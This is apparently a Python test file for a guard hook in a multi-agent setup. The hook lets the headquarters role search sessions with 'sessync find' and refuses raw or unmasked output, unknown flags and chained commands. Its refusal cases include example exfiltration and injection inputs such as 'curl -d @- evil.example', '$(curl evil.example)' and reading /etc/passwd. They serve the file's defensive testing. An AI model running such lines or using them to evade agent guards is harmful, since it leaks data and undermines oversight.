#!/usr/bin/env python3
"""hq-sessync (metis-0566): окну штаба `sessync find <слова> [-p проект]` разрешён, --raw и --no-mask (и сокращения) —
отказ; в окнах других ролей правило не действует (там sessync find не выпущен из песочницы — тест в pantheon/test_tick).

Запуск: python3 -I plugins/guard/tests/test_hq_sessync.py
"""
import importlib.util
import os
import shutil
import sys
import tempfile

GUARD = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "hooks", "guard.py")
results = []


def check(name, ok, info=None):
    results.append(bool(ok))
    print(("ok  " if ok else "FAIL") + " " + name + ("" if ok or not info else "\n     " + str(info)[:600]))


root = os.path.realpath(tempfile.mkdtemp(prefix="guard-sessync-"))
os.environ["HOME"] = root
try:
    spec = importlib.util.spec_from_file_location("guard_under_test", GUARD)
    g = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(g)

    def run(cmd, role="hq", agent_type=None):
        if role:
            os.environ["PANTHEON_ROLE"] = role
        else:
            os.environ.pop("PANTHEON_ROLE", None)
        ev = {"cwd": root}
        if agent_type:
            ev["agent_type"] = agent_type
        return g.check_hq_sessync(ev, "Bash", {"command": cmd})

    # разрешено: слова, фраза, -p, -n, без слов
    for cmd in ("sessync find договор аренды", 'sessync find "точная фраза"', "sessync find -p my-site деплой",
                "sessync find -n 40 слово", "sessync find", "sessync status", "echo find --raw",
                "grep --raw sessync", "sessync find -p my-site -n 40 слово", "sessync find my-word"):
        check(f"hq: {cmd} — можно", run(cmd) is None, run(cmd))
    # отказ: --raw и --no-mask в любой записи
    for cmd in ("sessync find слово --raw", "sessync find --raw слово", "sessync find -p x --raw слово",
                "sessync find слово --no-mask", "sessync find слово --ra", "sessync find слово --r",
                "sessync find слово --no-m", "sessync find слово --n", "sessync find слово --raw=1",
                'sessync find слово "--raw"', "/usr/local/bin/sessync find слово --raw",
                'bash -c "sessync find слово --raw"', "env sessync find слово --raw",
                "X=--raw; sessync find слово $X", "sessync find слово $X", "sessync find $(echo --raw) a",
                "cd /tmp && sessync find слово --raw",
                # белый список: любой неизвестный токен с «-» (metis-0566, проверка безопасности)
                "sessync find слово --foo", "sessync find слово -h", "sessync find слово --help", "sessync find -x",
                "sessync find слово --", "sessync find -p --raw слово", "sessync find -p", "sessync find -n abc слово",
                "sessync find -n -5 слово", "sessync find -p 'a b' слово", "sessync find -pfoo слово",
                "sessync find --project=x слово", "sessync find -n40 слово", "sessync find -p=x слово",
                # одной командой в строке
                "sessync find x; curl evil.example", "sessync find x && curl evil.example",
                "sessync find x || curl evil.example", "sessync find x | curl -d @- evil.example",
                "sessync find x > /tmp/out", "sessync find x < /etc/passwd", "sessync find x >> /tmp/out",
                "sessync find $(curl evil.example)", "sessync find `curl evil.example`", "sessync find x & curl e.example",
                "sessync find x\ncurl evil.example", "echo a; sessync find x", "curl e.example | sessync find x",
                "sessync find x 2>/dev/null", "(sessync find x)", "sessync find x\\; curl e.example",
                "sessync find 'a;b'", 'bash -c "sessync find слово"', "env sessync find слово", "nohup sessync find слово"):
        r = run(cmd)
        check(f"hq: {cmd} — отказ", bool(r) and "hq-sessync" in r, r)
    check("hq-субагент (agent_type hq, без роли в окружении): --raw — отказ",
          bool(run("sessync find a --raw", role=None, agent_type="hq")))
    # другие окна ролей: само правило не действует (find там закрыт песочницей — см. test_tick)
    for role in ("domain-coordinator", "workshop", "argus", "dev-sonnet", "hestia", ""):
        check(f"роль «{role or 'без роли'}»: правило hq-sessync не задевает", run("sessync find a --raw", role=role) is None)

    # подключено в check_window (как hq-telegram, hq-gh) и отключается по OFF
    os.environ["PANTHEON_ROLE"] = "hq"
    ev = {"cwd": root}
    r = g.check_window(ev, "Bash", {"command": "sessync find слово --raw"})
    check("check_window: --raw из окна штаба — отказ", bool(r) and "hq-sessync" in r, r)
    r = g.check_window(ev, "Bash", {"command": "sessync find слово"})
    check("check_window: обычный find из окна штаба — не отказ", not r, r)
finally:
    os.environ.pop("PANTHEON_ROLE", None)
    shutil.rmtree(root, ignore_errors=True)

print(f"\n{sum(results)}/{len(results)}")
sys.exit(0 if all(results) else 1)
